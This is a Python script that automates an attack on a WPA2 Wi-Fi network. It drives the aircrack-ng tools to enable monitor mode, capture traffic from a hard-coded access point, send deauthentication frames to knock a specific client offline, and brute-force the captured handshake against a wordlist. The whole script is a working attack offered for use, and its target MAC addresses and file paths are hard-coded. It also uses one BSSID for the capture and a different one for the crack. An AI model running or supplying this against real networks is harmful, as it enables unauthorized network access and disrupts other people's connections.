import subprocess
import time

def run_command(command, wait=True):
    print(f"[+] Running: {command}")
    process = subprocess.run(command, shell=True, capture_output=True, text=True)
    print(process.stdout)
    if process.stderr:
        print(f"[!] Error:\n{process.stderr}")
    if wait:
        time.sleep(2)

def main():
    try:
        # View network interfaces
        run_command("ifconfig")

        # Start monitor mode on wlan0
        run_command("airmon-ng start wlan0")

        # Kill interfering processes
        run_command("airmon-ng check kill")

        # Confirm monitor mode
        run_command("iwconfig")

        # Start scanning Wi-Fi networks (optional: user can cancel manually)
        print("[*] Scanning... press Ctrl+C when ready to select BSSID.")
        run_command("airodump-ng wlan0mon", wait=False)
        input("[*] Press Enter after stopping airodump-ng and noting BSSID/channel...")

        # Replace with your captured BSSID and channel
        bssid = "A8:32:9A:00:CE:96"
        channel = "11"
        output_file = "/root/Desktop/wpa2"

        # Target specific BSSID and channel
        run_command(f"airodump-ng --bssid {bssid} -c {channel} -w {output_file} -- wlan0mon")

        # Deauthentication attack
        target_client = "08:4A:CF:7D:47:14"
        run_command(f"aireplay-ng -0 20 -a {bssid} -c {target_client} wlan0mon")

        # Brute force WPA2
        handshake_bssid = "A8:32:9A:00:66:E8"
        wordlist_path = "/media/root/CAF04BE4F04BD57B/test/word.txt"
        cap_file_path = "/media/root/CAF04BE4F04BD57B/test/Digicom-01.cap"
        run_command(f"aircrack-ng -a2 -b {handshake_bssid} -w {wordlist_path} {cap_file_path}")

    finally:
        # Stop monitor mode and restart network services
        run_command("airmon-ng stop wlan0mon")
        run_command("service network-manager restart")

if __name__ == "__main__":
    main()
